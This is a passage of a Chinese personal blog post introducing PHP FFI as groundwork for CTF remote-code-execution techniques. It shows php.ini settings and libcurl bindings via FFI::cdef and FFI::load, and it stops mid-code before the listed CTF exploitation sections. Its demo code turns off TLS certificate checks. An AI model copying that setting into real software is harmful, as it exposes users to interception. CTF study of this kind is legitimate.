@@ -1,0 +1,550 @@
+<!doctype html><html lang=en dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content='0x01 前言 我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看\n0x02 question 了解 当PHP7.4降临，与他一同前来的还有一个强大拓展PHP FFI\n它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。\nFor PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.\n加载C库：可以通过FFI直接加载共享库（如.so或.dll文件）。 定义C函数和类型：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。 调用C函数：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们 FFI::cdef 看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的curl，和libcurl来进行对比\n首先我们修改ini文件\n1 2 extension=ffi ffi.enable=true 然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行\n接下来放出源码\n1 2 3 4 5 6 7 8 9 10 11 <?php $url = "https://www.laruence.com/2020/03/11/5475.html"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_exec($ch); curl_close($ch); 这是不使用FFI的情况\n'><title>php中不出网的FFI</title><link rel=canonical href=https://baozongwi.xyz/p/php-non-outbound-ffi/><link rel=stylesheet href=/scss/style.min.0fd9f1efab870423165ae7588bc203f4d3a9f9422c89352ef010f8c63e7225f0.css><meta property='og:title' content="php中不出网的FFI"><meta property='og:description' content='0x01 前言 我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看\n0x02 question 了解 当PHP7.4降临，与他一同前来的还有一个强大拓展PHP FFI\n它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。\nFor PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.\n加载C库：可以通过FFI直接加载共享库（如.so或.dll文件）。 定义C函数和类型：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。 调用C函数：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们 FFI::cdef 看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的curl，和libcurl来进行对比\n首先我们修改ini文件\n1 2 extension=ffi ffi.enable=true 然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行\n接下来放出源码\n1 2 3 4 5 6 7 8 9 10 11 <?php $url = "https://www.laruence.com/2020/03/11/5475.html"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_exec($ch); curl_close($ch); 这是不使用FFI的情况\n'><meta property='og:url' content='https://baozongwi.xyz/p/php-non-outbound-ffi/'><meta property='og:site_name' content="baozongwi's blog"><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='php'><meta property='article:tag' content='姿势'><meta property='article:published_time' content='2024-11-08T09:27:18+00:00'><meta property='article:modified_time' content='2024-11-08T09:27:18+00:00'><meta name=twitter:title content="php中不出网的FFI"><meta name=twitter:description content='0x01 前言 我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看\n0x02 question 了解 当PHP7.4降临，与他一同前来的还有一个强大拓展PHP FFI\n它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。\nFor PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.\n加载C库：可以通过FFI直接加载共享库（如.so或.dll文件）。 定义C函数和类型：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。 调用C函数：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们 FFI::cdef 看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的curl，和libcurl来进行对比\n首先我们修改ini文件\n1 2 extension=ffi ffi.enable=true 然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行\n接下来放出源码\n1 2 3 4 5 6 7 8 9 10 11 <?php $url = "https://www.laruence.com/2020/03/11/5475.html"; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); curl_exec($ch); curl_close($ch); 这是不使用FFI的情况\n'><link rel="shortcut icon" href=/logo.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label="Toggle Menu">
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src=/img/acvtar_hu_773da4d2b586f7f.jpg width=300 height=300 class=site-logo loading=lazy alt=Avatar></a></figure><div class=site-meta><h1 class=site-name><a href=/>baozongwi's blog</a></h1></div></header><ol class=menu-social><li><a href=https://github.com/baozongwi target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=mailto:baozongwi@qq.com target=_blank title=Email rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-mail"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 7a2 2 0 012-2h14a2 2 0 012 2v10a2 2 0 01-2 2H5a2 2 0 01-2-2V7z"/><path d="M3 7l9 6 9-6"/></svg></a></li><li><a href=https://discord.com/users/1276595362970337414 target=_blank title=discord rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-discord"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M8 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M14 12a1 1 0 102 0 1 1 0 00-2 0"/><path d="M15.5 17c0 1 1.5 3 2 3 1.5.0 2.833-1.667 3.5-3 .667-1.667.5-5.833-1.5-11.5-1.457-1.015-3-1.34-4.5-1.5l-.972 1.923a11.913 11.913.0 00-4.053.0L9 4c-1.5.16-3.043.485-4.5 1.5-2 5.667-2.167 9.833-1.5 11.5.667 1.333 2 3 3.5 3 .5.0 2-2 2-3"/><path d="M7 16.5c3.5 1 6.5 1 10 0"/></svg></a></li><li><a href=https://www.yuque.com/baozongwi/kkn04k target=_blank title=travel rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-map-pin"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 11a3 3 0 106 0 3 3 0 00-6 0"/><path d="M17.657 16.657 13.414 20.9a2 2 0 01-2.827.0l-4.244-4.243a8 8 0 1111.314.0z"/></svg></a></li><li><a href=/index.xml target=_blank title=RSS rel=me><svg class="icon icon-tabler icon-tabler-rss" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="5" cy="19" r="1"/><path d="M4 4a16 16 0 0116 16"/><path d="M4 11a9 9 0 019 9"/></svg></a></li><li><a href=https://www.travellings.cn/go.html target=_blank title=Travelling rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width=".5" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tram-front-icon lucide-tram-front"><rect width="16" height="16" x="4" y="3" rx="2"/><path d="M4 11h16"/><path d="M12 3v8"/><path d="m8 19-2 3"/><path d="m18 22-2-3"/><path d="M8 15h.01"/><path d="M16 15h.01"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/about/><svg class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="7" r="4"/><path d="M6 21v-2a4 4 0 014-4h4a4 4 0 014 4v2"/></svg>
+<span>About</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>Dark Mode</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">Table of contents</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#了解>了解</a><ol><li><a href=#fficdef>FFI::<strong>cdef</strong></a></li><li><a href=#ffiload>FFI::load</a></li><li><a href=#ffinew>FFI::new</a></li></ol></li><li><a href=#利用姿势>利用姿势</a><ol><li><a href=#rctf-2019nextphp>[RCTF 2019]Nextphp</a></li><li><a href=#tctf-2020-easyphp>TCTF 2020 easyphp</a></li><li><a href=#noeasyphprevenge>noeasyphp(revenge)</a></li><li><a href=#极客大挑战-2020-fighterfightsinvincibly>[极客大挑战 2020] FighterFightsInvincibly</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/talk/>Talk</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/php-non-outbound-ffi/>php中不出网的FFI</a></h2></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published datetime=2024-11-08T09:27:18Z>Nov 08, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>5 minute read</time></div></footer></div></header><section class=article-content><div class=outdated-notice><span class=outdated-notice__icon><svg class="icon icon-tabler icon-tabler-messages" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M21 14l-3-3h-7a1 1 0 01-1-1V4a1 1 0 011-1h9a1 1 0 011 1v10"/><path d="M14 15v2a1 1 0 01-1 1H6l-3 3V11a1 1 0 011-1h2"/></svg>
+</span><span>友情提示：本文最后更新于 461 天前，文中的内容可能已有所发展或发生改变。</span></div><h1 id=0x01-前言>0x01 前言</h1><p>我知道这个姿势是在暑假的8月份好像是极客大挑战的RCE5？，一直耽搁着到现在来看看</p><h1 id=0x02-question>0x02 question</h1><h2 id=了解>了解</h2><p>当PHP7.4降临，与他一同前来的还有一个强大拓展<code>PHP FFI</code></p><blockquote><p>它允许PHP代码调用C语言库中的函数，而无需编写和编译传统的PHP扩展。通过FFI，开发者可以直接在PHP中编写与C库的接口（bindings），而不必使用C语言编写扩展。这极大地简化了扩展PHP功能的过程，并使其更灵活。</p><p>For PHP, FFI opens a way to write PHP extensions and bindings to C libraries in pure PHP.</p></blockquote><ol><li><strong>加载C库</strong>：可以通过FFI直接加载共享库（如<code>.so</code>或<code>.dll</code>文件）。</li><li><strong>定义C函数和类型</strong>：在PHP中以字符串的形式定义C语言的函数、结构体、类型等。</li><li><strong>调用C函数</strong>：一旦定义了C函数，就可以像调用PHP函数一样在PHP中调用它们</li></ol><h3 id=fficdef>FFI::<strong>cdef</strong></h3><p><img src=/p/php-non-outbound-ffi/QQ20241110-134035.png width=1029 height=869 loading=lazy alt=1></p><p>看不懂啊，那我们看demo，以师傅的例子来讲，我们用PHP的<code>curl</code>，和<code>libcurl</code>来进行对比</p><p>首先我们修改<code>ini</code>文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>extension=ffi
+</span></span><span class=line><span class=cl>ffi.enable=true
+</span></span></code></pre></td></tr></table></div></div><p>然后写demo就发现有很多问题，比如说找不到什么的，然后查了查，只有Linux才行</p><p>接下来放出源码</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;https://www.laruence.com/2020/03/11/5475.html&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$ch</span> <span class=o>=</span> <span class=nx>curl_init</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nx>curl_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>curl_exec</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nx>curl_close</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>这是不使用FFI的情况</p><p>那么如果使用FFI的话</p><p>curl.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=no>CURLOPT_URL</span> <span class=o>=</span> <span class=mi>10002</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=no>CURLOPT_SSL_VERIFYPEER</span> <span class=o>=</span> <span class=mi>64</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=s>&lt;&lt;&lt;</span><span class=dl>CTYPE</span><span class=s>
+</span></span></span><span class=line><span class=cl><span class=s>void *curl_easy_init();
+</span></span></span><span class=line><span class=cl><span class=s>int curl_easy_setopt(void *curl, int option, ...);
+</span></span></span><span class=line><span class=cl><span class=s>int curl_easy_perform(void *curl);
+</span></span></span><span class=line><span class=cl><span class=s>void curl_easy_cleanup(void *handle);
+</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>CTYPE</span>
+</span></span><span class=line><span class=cl>    <span class=p>,</span> <span class=s2>&#34;libcurl.so&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>test.php</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>global</span> <span class=nv>$libcurl</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>require</span> <span class=s2>&#34;curl.php&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$url</span> <span class=o>=</span> <span class=s2>&#34;https://www.laruence.com/2020/03/11/5475.html&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$ch</span> <span class=o>=</span> <span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_init</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_URL</span><span class=p>,</span> <span class=nv>$url</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_setopt</span><span class=p>(</span><span class=nv>$ch</span><span class=p>,</span> <span class=nx>CURLOPT_SSL_VERIFYPEER</span><span class=p>,</span> <span class=mi>0</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_perform</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$libcurl</span><span class=o>-&gt;</span><span class=na>curl_easy_cleanup</span><span class=p>(</span><span class=nv>$ch</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>我们主要是看<code>curl.php</code>，这里的话使用了<code>FFI::cdef</code>来定义调用函数的原参数式子</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=nx>string</span> <span class=nv>$c_definition</span><span class=p>,</span> <span class=nx>string</span> <span class=nv>$library</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=o>/*</span><span class=nv>$c_definition</span><span class=o>:</span> <span class=nx>这是一个字符串，包含</span> <span class=nx>C</span> <span class=nx>语言函数和类型的声明。可以使用</span> <span class=nx>heredoc</span> <span class=nx>语法来定义多行字符串，使得代码更加清晰。</span>
+</span></span><span class=line><span class=cl><span class=nv>$library</span><span class=o>:</span> <span class=nx>这是一个字符串，表示要加载的共享库的名称（例如</span> <span class=nx>libcurl</span><span class=o>.</span><span class=nx>so</span> <span class=nx>或者任何其他共享库的路径）。</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$libcurl</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>cdef</span><span class=p>(</span><span class=s>&lt;&lt;&lt;</span><span class=dl>CTYPE</span><span class=s>
+</span></span></span><span class=line><span class=cl><span class=s>void *curl_easy_init();
+</span></span></span><span class=line><span class=cl><span class=s>int curl_easy_setopt(void *curl, int option, ...);
+</span></span></span><span class=line><span class=cl><span class=s>int curl_easy_perform(void *curl);
+</span></span></span><span class=line><span class=cl><span class=s>void curl_easy_cleanup(void *handle);
+</span></span></span><span class=line><span class=cl><span class=s></span><span class=dl>CTYPE</span>
+</span></span><span class=line><span class=cl>    <span class=p>,</span> <span class=s2>&#34;libcurl.so&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>在 PHP 中，通过使用 <code>&lt;&lt;&lt;</code> 语法，可以定义所谓的 &ldquo;heredoc&rdquo; 字符串，<code>CTYPE</code> 就是这个 heredoc 的标识符。所以这里我们是从<code>libcurl.so</code>里面导入了四个函数</p><h3 id=ffiload>FFI::load</h3><p><img src=/p/php-non-outbound-ffi/QQ20241110-133939.png width=1056 height=846 loading=lazy alt=1></p><p>那么我们接着实验如果要将结果写入文件的话，我们可以写两个文件头来进行这样的操作</p><p>安装个C语言在vps避免出现问题</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>sudo apt install gcc
+</span></span><span class=line><span class=cl>sudo apt install g++
+</span></span></code></pre></td></tr></table></div></div><p>file.h</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>fopen</span><span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=n>filename</span><span class=p>,</span> <span class=kt>char</span> <span class=o>*</span><span class=n>mode</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>fclose</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span> <span class=n>fp</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><p>curl.h</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define FFI_LIB &#34;libcurl.so&#34;
+</span></span></span><span class=line><span class=cl><span class=cp></span> 
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=o>*</span><span class=nf>curl_easy_init</span><span class=p>();</span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>curl_easy_setopt</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>curl</span><span class=p>,</span> <span class=kt>int</span> <span class=n>option</span><span class=p>,</span> <span class=p>...);</span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>curl_easy_perform</span><span class=p>(</span><span class=kt>void</span> <span class=o>*</span><span class=n>curl</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>curl_easy_cleanup</span><span class=p>(</span><span class=n>CURL</span> <span class=o>*</span><span class=n>handle</span><span class=p>);</span>
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=no>CURLOPT_URL</span> <span class=o>=</span> <span class=mi>10002</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=no>CURLOPT_SSL_VERIFYPEER</span> <span class=o>=</span> <span class=mi>64</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=k>const</span> <span class=no>CURLOPT_WRITEDATA</span> <span class=o>=</span> <span class=mi>10001</span><span class=p>;</span>
+</span></span><span class=line><span class=cl> 
+</span></span><span class=line><span class=cl><span class=nv>$libc</span> <span class=o>=</span> <span class=nx>FFI</span><span class=o>::</span><span class=na>load</span><span class=p>(</span><span class=s2>&#34;file.h&#34;</span><span class=p>);</span>
